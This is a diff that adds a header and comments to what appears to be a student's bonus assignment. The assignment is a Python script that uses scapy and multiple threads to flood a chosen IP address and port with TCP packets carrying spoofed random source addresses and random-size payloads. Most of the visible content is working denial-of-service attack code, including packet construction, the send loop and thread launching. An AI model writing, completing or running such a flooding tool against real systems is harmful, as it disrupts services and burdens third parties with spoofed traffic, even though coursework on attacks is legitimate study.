@@ -1,6 +1,17 @@
+"""
+Amanda Bedard
+Task 7: DOS (Bonus)
+
+Below is a python script that uses multi-threading to perform a TCP flooding
+Denial of Service (DOS) attack on a user-specified ip address/port pairing.
+This attack uses a randomly generated IP address and user specified port to
+attack the target for a specified duration.
+"""
 import random, sys, os, time, threading
 from scapy.all import *
 
+#Scapy does way too much logging. Since we do not want to hinder our performance with
+#surplus logging, I created these functions to suppress it
 def stopOutput():
   sys.stdout = open(os.devnull, 'w')
 
@@ -35,8 +46,12 @@ def sendPackets():
 
         ip = IP(src = sourceAddr, dst = target)
         tcp = TCP(sport = sourcePort, dport = targetPort)
+
+        #Here we have a random string being generated for the packet data of a specified size
+        #this allows us to send a lot of really big packets or really small ones
         packet = ip / tcp / Raw(RandString(size=packetSize))
         send(packet,inter = .001)
+
         #Setting the time again before we re-loop  
         timer = time.time()  
         i += 1
@@ -54,6 +69,7 @@ while (thread <= threads):
     threadList.append(x)
     x.start()
 
+#Joining them so we wait until they are all done before exiting the program
 for t in threadList:
     t.join()
 
